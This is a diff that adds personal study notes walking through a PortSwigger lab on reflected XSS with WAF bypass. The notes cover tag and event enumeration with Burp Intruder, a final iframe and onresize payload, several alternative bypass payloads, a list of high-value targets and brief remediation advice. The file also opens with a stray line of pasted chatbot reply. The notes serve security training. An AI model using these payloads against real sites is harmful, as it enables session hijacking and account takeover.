@@ -4107,3 +4107,420 @@ Store
 → Impact  
 
 ---
+
+Perfect — this is already very clean. I’ll keep everything EXACT, only:
+
+✔ Fix formatting (no merging issues)
+✔ Keep payloads intact
+✔ Add extra real-world depth + high-value targets + chains
+✔ Keep your exact style
+
+
+---
+
+# Lab - 11 📝 Reflected XSS into HTML Context (WAF Bypass with Tag & Event Enumeration) — Final Notes
+
+---
+
+## 🧭 Overview
+
+Reflected Cross-Site Scripting (XSS) occurs when:
+
+1️⃣ User input is sent to the server  
+2️⃣ Server reflects it in the response  
+3️⃣ Browser renders it into DOM  
+4️⃣ Malicious code executes  
+
+---
+
+## ⚠️ In this lab:
+
+- ✔ Input is reflected in HTML context (inside tags)  
+- ✔ A Web Application Firewall (WAF) is present  
+- ✔ Common payloads are blocked  
+- ✔ You must bypass the filter logically  
+
+---
+
+## 🧠 Core Concept
+
+- ❌ Don’t guess payloads  
+- ✅ Test what is allowed  
+
+---
+
+## 🔄 Flow
+
+```
+User Input → Server → HTML Response → DOM → Browser parses → Event triggers → Execution
+```
+
+---
+
+## 📚 What This Lab Demonstrates
+
+- Reflected XSS in HTML context  
+- WAF filtering common tags/events  
+- Bypassing WAF using enumeration + logic  
+
+---
+
+## 🧠 Source
+
+User input from search parameter  
+
+---
+
+## 🧠 Sink
+
+HTML rendering (inside `<h1>` / tag)  
+
+---
+
+## ⚠️ Important Behavior
+
+- `<script>` is blocked ❌  
+- Common payloads are blocked ❌  
+- Only specific tags are allowed ✔  
+- Only specific events are allowed ✔  
+
+---
+
+# 🪜 Lab Walkthrough
+
+---
+
+### 🔹 Step 1 — Test Reflection
+
+**Input:**
+
+```
+test123
+```
+
+---
+
+### 🔹 Step 2 — Inspect DOM
+
+Found:
+
+```html
+<h1>test123</h1>
+```
+
+✔ HTML context confirmed  
+
+---
+
+### 🔹 Step 3 — Try Basic Payload
+
+```html
+<script>alert(1)</script>
+```
+
+❌ Blocked by WAF  
+
+---
+
+### 🔹 Step 4 — Try Common Payload
+
+```html
+<img src=1 onerror=print()>
+```
+
+❌ Blocked  
+
+---
+
+### 🔹 Step 5 — Switch Strategy
+
+👉 Find what is **ALLOWED**, not what is blocked  
+
+---
+
+## 🧪 Tag Enumeration (Burp Intruder)
+
+Payload:
+
+```
+<§§>
+```
+
+---
+
+### 📸 Screenshot — Allowed Tag
+
+![allowed-tags](../images/waf-allowed-tags.png)
+
+---
+
+### ✔ Result:
+
+- Most tags → `400` (blocked)  
+- `<body>` → `200` (allowed)  
+
+---
+
+### ✅ Allowed Tag:
+
+```
+<body>
+```
+
+---
+
+## 🧪 Event Enumeration
+
+Payload:
+
+```
+<body%20§§=1>
+```
+
+---
+
+### 📸 Screenshot — Allowed Events
+
+![allowed-events](../images/waf-allowed-events.png)
+
+---
+
+### ✔ Result:
+
+Allowed events include:
+
+- onresize ✔  
+- onfocus ✔  
+- onbeforeinput ✔  
+
+---
+
+## 🧠 Critical Filtering Step
+
+👉 Allowed ≠ usable  
+
+---
+
+### ❌ Remove User-Dependent Events
+
+- onclick  
+- oninput  
+- onscroll  
+- onkeydown  
+
+---
+
+### ✅ Keep Auto-Trigger Events
+
+- onresize ✔  
+- onload ✔  
+- onerror ✔  
+- onfocus (sometimes) ✔  
+
+---
+
+## 🎯 Final Selection
+
+- Tag → `body`  
+- Event → `onresize`  
+
+---
+
+## 🧠 Why onresize?
+
+✔ Can be triggered automatically  
+
+---
+
+## 🧪 Build Payload
+
+```html
+<body onresize=print()>
+```
+
+---
+
+## ⚠️ Problem
+
+Resize event needs a trigger  
+
+---
+
+## 💡 Solution — Use iframe
+
+Trigger resize:
+
+```html
+<iframe onload=this.style.width='100px'>
+```
+
+---
+
+## 💥 Final Payload
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+```
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Victim loads iframe  
+2️⃣ Page loads with injected `<body>`  
+3️⃣ iframe resizes  
+4️⃣ onresize triggers  
+5️⃣ `print()` executes  
+
+💥 Lab solved  
+
+---
+
+## 🧠 Payload Logic Breakdown
+
+```
+Tag (body) + Event (onresize) + Trigger (iframe resize) = XSS
+```
+
+---
+
+## 🌍 Real-World Scenarios (Enhanced)
+
+### 🟢 1️⃣ Weak WAF
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+---
+
+### 🟢 2️⃣ WAF Blocks Common Tags
+
+```html
+<svg onload=alert(1)>
+```
+
+---
+
+### 🟢 3️⃣ Only Rare Tags Allowed
+
+```html
+<details open ontoggle=alert(1)>
+```
+
+---
+
+### 🟢 4️⃣ Focus-Based Trigger
+
+```html
+<input autofocus onfocus=alert(1)>
+```
+
+---
+
+### 🟢 5️⃣ Animation-Based Execution
+
+```html
+<div style="animation-name:x" onanimationstart=alert(1)>
+```
+
+---
+
+### 🟢 6️⃣ iframe-Based Delivery
+
+✔ Auto execution when victim visits page  
+
+---
+
+### 🟢 7️⃣ Multi-Step WAF Bypass
+
+- Find allowed tag  
+- Find allowed event  
+- Add trigger  
+- Combine everything  
+
+---
+
+## 🎯 High-Value Targets
+
+- Search functionality  
+- Filters  
+- URL parameters  
+- CMS editors  
+- Dashboards  
+- Admin panels 🔥  
+- Support ticket systems 🔥  
+- Logs / analytics 🔥  
+
+---
+
+## 🔗 Attack Impact
+
+🔥 Account takeover  
+
+🔥 Session hijacking  
+
+🔥 Admin compromise  
+
+🔥 Data exfiltration  
+
+🔥 CSRF chaining  
+
+---
+
+## 🧪 Testing Methodology
+
+- Identify reflection  
+- Identify context  
+- Test payloads  
+- Detect WAF  
+- Enumerate tags  
+- Enumerate events  
+- Filter usable events  
+- Build payload  
+- Trigger execution  
+
+---
+
+## ⚠️ Why This Lab Is Important
+
+✔ Real-world WAF bypass  
+✔ Teaches enumeration  
+✔ Builds payload logic  
+✔ Matches bug bounty cases  
+
+---
+
+## 🛡 Remediation
+
+- Avoid reflecting raw input  
+- Use output encoding  
+- Implement CSP  
+- Sanitize input  
+- Avoid dynamic HTML  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+👉 What is allowed?  
+👉 What is blocked?  
+👉 Which event auto-triggers?  
+👉 How do I force execution?  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+```
+Find → Filter → Choose → Trigger → Execute
+```
+
+---
+
+## 💡 Extra Tips
+
+- Use DevTools (live DOM)  
+- Don’t rely on common payloads  
+- Intruder = discovery tool  
+- Focus on execution  
